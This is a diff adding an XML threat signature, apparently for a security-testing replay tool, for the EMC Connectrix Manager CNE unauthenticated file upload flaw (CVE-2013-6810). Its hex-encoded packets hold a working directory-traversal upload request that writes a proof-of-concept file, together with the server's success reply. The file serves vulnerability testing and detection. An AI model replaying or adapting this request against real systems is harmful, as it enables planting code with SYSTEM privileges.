@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="EMC CMCNE http-file-upload.war FileUploadController Arbitrary File Upload"/>
+    <EngDesc display="true" value="A code execution vulnerability exists in EMC Connectrix Manager Converged Network Edition. The vulnerability is due to lack of authentication and insufficient input validation in the FileUploadController servlet of http-file-upload.war when processing HTTP requests. A remote unauthenticated attacker can upload arbitrary files to arbitrary locations. In a successful attack scenario, the attacker can execute arbitrary code with SYSTEM privileges by placing executable files in critical locations."/>
+    <Intent display="true">
+      <item value="DIRECTORY_TRAVERSAL"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="EMC"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Connectrix_Manager_Converged_Network_Edition"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="12.0.3_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20131212-05"/>
+    <CVEID display="true" value="CVE-2013-6810"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="101195"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="521231633a1d6e64f21e66684e0cc065"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635366994005153126"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1401183017" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:0E:C3" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0237" Identification="C44B" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="12CD" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="41972" destPort="$HTTPdestPort" SeqNumber="7DEA51A4" AckNumber="2505756E" HeaderLength="08" WindowSize="002E" Checksum="A3BC" UrgentPointer="0000" Options="0101080A38B195EC00000000" Payload="504F5354202F4874747046696C6555706C6F61642F46696C6555706C6F6164436F6E74726F6C6C65722E646F20485454502F312E310D0A486F73743A20646863703133343A38300D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E31290D0A736F757263653A206472697665720D0A647269766572466F6C6465724E616D653A202E2E2F2E2E2F0D0A436F6E74656E742D547970653A206D756C7469706172742F666F726D2D646174613B20626F756E646172793D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D376461323138373339303536630D0A436F6E74656E742D4C656E6774683A20323330200D0A0D0A0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D376461323138373339303536630D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D22706F63223B2066696C656E616D653D222E2E2F2E2E2F2E2E2F706F632E747874220D0A436F6E74656E742D547970653A206170706C69636174696F6E2F6F637465742D73747265616D0D0A0D0A54454C5553205365637572697479206C6162732C2050726F6F66206F6620436F6E636570740D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D376461323138373339303536632D2D" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:0E:C3" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00D3" Identification="0C18" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="8C64" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="41972" SeqNumber="2505756E" AckNumber="7DEA53A7" HeaderLength="08" WindowSize="F8ED" Checksum="D691" UrgentPointer="0000" Options="0101080A0017EFA438B195EC" Payload="485454502F312E3120323030204F4B0D0A436F6E74656E742D547970653A20746578742F68746D6C3B636861727365743D5554462D380D0A436F6E74656E742D4C656E6774683A2033300D0A446174653A205468752C203039204A616E20323031342031373A30323A333420474D540D0A5365727665723A206E756C6C0D0A0D0A5355434345535346554C4C592055504C4F414445442046494C4553210D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
